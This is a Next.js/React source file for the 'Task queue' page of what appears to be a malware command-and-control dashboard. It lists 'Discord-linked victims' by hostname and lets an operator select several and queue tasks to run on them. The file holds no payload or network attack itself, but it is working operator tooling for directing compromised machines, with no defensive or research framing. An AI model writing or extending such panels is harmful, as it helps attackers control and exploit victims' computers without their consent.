'use client';
import { Suspense, useState } from 'react';
import { useSearchParams } from 'next/navigation';
import { Plus, RefreshCw } from 'lucide-react';
import { Topbar } from '@/components/topbar';
import { TaskList } from '@/components/task-list';
import { TaskDialog } from '@/components/task-dialog';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Select } from '@/components/ui/input';
import { useApi } from '@/hooks/useApi';
import { useCanWrite } from '@/components/live-provider';
import type { Page, Victim } from '@/lib/types';

function TasksInner() {
  const params = useSearchParams();
  const status = params.get('status') ?? '';
  const [dialog, setDialog] = useState(false);
  const victims = useApi<Page<Victim>>('/victims?linked=1&limit=200');
  const [selected, setSelected] = useState<string[]>([]);
  const canWrite = useCanWrite();

  return (
    <>
      <Topbar title="Task queue" subtitle="lease-based · timeout enforced server-side" />
      <div className="space-y-2 pt-3">
        <div className="flex items-center gap-2">
          <Select defaultValue={status} onChange={(event) => { location.href = `/tasks?status=${event.target.value}`; }}>
            <option value="">all states</option><option value="queued">queued</option><option value="running">running</option><option value="done">done</option><option value="error">error</option><option value="cancelled">cancelled</option>
          </Select>
          <Button size="sm" variant="secondary" onClick={() => location.reload()}><RefreshCw className="h-3 w-3" /> refresh</Button>
          <Button size="sm" className="ml-auto" onClick={() => setDialog(true)} disabled={selected.length === 0 || !canWrite}><Plus className="h-3 w-3" /> queue ({selected.length})</Button>
        </div>
        <Card>
          <div className="border-b border-line p-2">
            <p className="mb-1 text-2xs uppercase tracking-wide text-muted">Linked victims</p>
            <div className="flex max-h-24 flex-wrap gap-1 overflow-y-auto">
              {(victims.data?.items ?? []).map((victim) => (
                <button
                  key={victim.id}
                  onClick={() => setSelected((current) => current.includes(victim.id) ? current.filter((id) => id !== victim.id) : [...current, victim.id])}
                  className={`rounded border px-1.5 py-0.5 font-mono text-2xs ${selected.includes(victim.id) ? 'border-brand text-brand' : 'border-line text-muted'}`}
                >
                  {victim.hostname}
                </button>
              ))}
              {(victims.data?.items ?? []).length === 0 ? <span className="text-2xs text-muted">No Discord-linked victims</span> : null}
            </div>
          </div>
          <TaskList status={status || undefined} />
        </Card>
      </div>
      <TaskDialog
        open={dialog}
        onOpenChange={setDialog}
        victimIds={selected}
        victims={victims.data?.items}
        linked={selected.every((id) => !victims.data?.items.find((victim) => victim.id === id)?.discordMissingAt)}
      />
    </>
  );
}

export default function TasksPage() {
  return <Suspense fallback={<div className="p-4">loading…</div>}><TasksInner /></Suspense>;
}
